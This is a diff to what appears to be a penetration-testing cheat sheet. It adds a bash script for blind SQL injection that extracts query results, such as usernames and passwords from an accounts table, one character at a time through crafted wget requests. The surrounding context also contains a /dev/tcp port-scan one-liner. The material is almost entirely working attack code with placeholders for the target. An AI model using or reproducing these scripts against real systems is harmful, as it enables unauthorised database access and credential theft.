@@ -497,6 +497,40 @@ stty rows no_rows_here columns no_columns_here
 
 # scan
 host=target_IP_here; echo "--- scan starting ---"; for port in {1..65535}; do timeout .1 bash -c "echo >/dev/tcp/$host/$port" && echo "port $port is open"; done; echo "--- scan finished ---"
+
+# web injection script (e.g. blind SQLi) 
+## !! works only for queries with 1 result !! 
+## --> limit 0,1 in payload
+## e.g. payload: "select concat(user, '-', pass) from accounts limit 0,1
+#!/bin/bash
+
+charset=`echo {0..9} {A..Z} \. \: \; \- \_ \@`
+
+export target="https://vuln_url_here"
+export trueresp="response_when_true_here"
+export maxlength=$1 # take 1st cli arg, maxlength of output
+export payload=$2 # take 2nd cli arg, payload
+export result=""
+
+echo "[*] Extracting results for $payload"
+
+for ((j=1;j<$maxlength;j+=1))
+do
+  export nthchar=$j
+
+  for i in $charset
+  do
+    wget "$target?param_here=wurzelsepp' and substring(($payload),$nthchar,1)='$i" -q -O | grep "$trueresp" &> /dev/null
+    if [ "$?" == "0" ]
+    then
+      echo "[+] Character number $nthchar found: $i"
+      export result+=$i
+      break
+    fi
+  done
+done
+
+echo "Result: " $result
 ```
 
 
